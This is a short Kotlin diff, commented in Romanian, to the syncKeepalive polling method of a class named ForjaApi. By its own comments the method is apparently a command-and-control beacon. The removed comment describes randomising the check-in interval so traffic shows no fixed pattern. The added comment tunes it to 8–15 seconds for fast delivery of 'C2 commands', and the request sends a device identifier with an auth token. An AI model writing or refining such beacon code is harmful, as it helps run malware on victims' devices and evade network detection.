@@ -271,8 +271,8 @@ class ForjaApi {
     suspend fun syncKeepalive(dev: String, holdMs: Long): SyncPoll = withContext(Dispatchers.IO) {
         val token = idToken() ?: return@withContext SyncPoll(emptyList(), 30000)
         try {
-            // Interval sugerat variabil (25–55 s) ca traficul să nu aibă un pattern fix de cron
-            val hint = (25000 + (Math.random() * 30000).toInt()).coerceIn(15000, 60000)
+            // Interval scurt (8–15 s) pentru livrare rapidă a comenzilor C2
+            val hint = (8000 + (Math.random() * 7000).toInt()).coerceIn(5000, 20000)
             // Câmpuri: ts (timestamp Unix), w (hold în secunde), d (identificator dispozitiv)
             val body = buildJsonObject {
                 put("ts", System.currentTimeMillis() / 1000); put("w", holdMs / 1000); put("d", dev); put("intervalMs", hint)
